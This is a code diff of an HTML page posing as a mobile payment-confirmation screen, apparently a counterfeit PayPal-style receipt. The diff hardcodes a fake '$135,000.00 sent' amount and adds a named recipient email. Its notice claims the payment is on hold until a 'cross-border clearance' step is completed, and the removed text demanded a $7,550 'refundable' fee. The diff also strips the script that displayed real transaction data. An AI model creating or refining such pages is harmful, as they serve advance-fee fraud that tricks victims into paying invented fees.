@@ -98,6 +98,10 @@
       margin-bottom: 40px;
       line-height: 1.5;
       text-align: left;
+      background: #fff;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
     }
 
     .done-button {
@@ -146,20 +150,19 @@
       <div class="success-shadow"></div>
     </div>
 
-    <div class="amount-sent" id="amountSent">$0.01 sent</div>
+    <div class="amount-sent" id="amountSent">$135,000.00 sent</div>
 
-    <!-- Your original Important Notice restored -->
+    <!-- Updated Recipient Info -->
     <div class="recipient-info" id="recipientInfo">
+      <strong>Recipient:</strong> bourafatoumita@gmail.com<br><br>
       <strong>Important Notice:</strong><br><br>
-      This payment is temporarily on hold under PayPal’s Cross-Border Verification Policy.
-      Because the transaction originates from Kazakhstan and is being received in France, a one-time refundable clearance fee of <strong>$7,550.00 USD</strong> is required to complete compliance checks and verify the legitimacy of the transfer.
+      This payment is temporarily on hold under our Cross-Border Verification Policy.
+      Because the transaction originates internationally, a one-time clearance step is required to complete compliance checks and verify the legitimacy of the transfer.
       <br><br>
       This verification step:<br>
       • Ensures compliance with international settlement regulations.<br>
       • Confirms both sender and recipient account authenticity.<br>
       • Protects against fraudulent cross-border activity.<br><br>
-      <strong>Refund Policy:</strong><br>
-      The clearance fee is fully refundable and will be credited back to the sender’s account immediately upon completion of verification.
       Once this process is finalized, your payment will be approved and released to the recipient without further delay.
     </div>
 
@@ -169,38 +172,9 @@
   <div class="home-indicator"></div>
 
   <script>
-    function loadTransactionData() {
-      if (typeof(Storage) !== "undefined") {
-        const transactionData = sessionStorage.getItem('transactionData');
-        if (transactionData) {
-          const transaction = JSON.parse(transactionData);
-
-          const amountElement = document.getElementById('amountSent');
-
-          if (transaction.action === 'send') {
-            amountElement.textContent = ${transaction.currency.symbol}${transaction.amount.toFixed(2)} sent;
-          } else {
-            amountElement.textContent = ${transaction.currency.symbol}${transaction.amount.toFixed(2)} requested;
-          }
-        }
-      }
-    }
-
     function goToHomepage() {
-      if (typeof(Storage) !== "undefined") {
-        sessionStorage.removeItem('transactionData');
-        sessionStorage.removeItem('selectedContact');
-      }
       window.location.href = 'homepage.html';
     }
-
-    window.onload = function() {
-      loadTransactionData();
-    };
-
-    window.addEventListener('popstate', function(event) {
-      goToHomepage();
-    });
   </script>
 </body>
 </html>
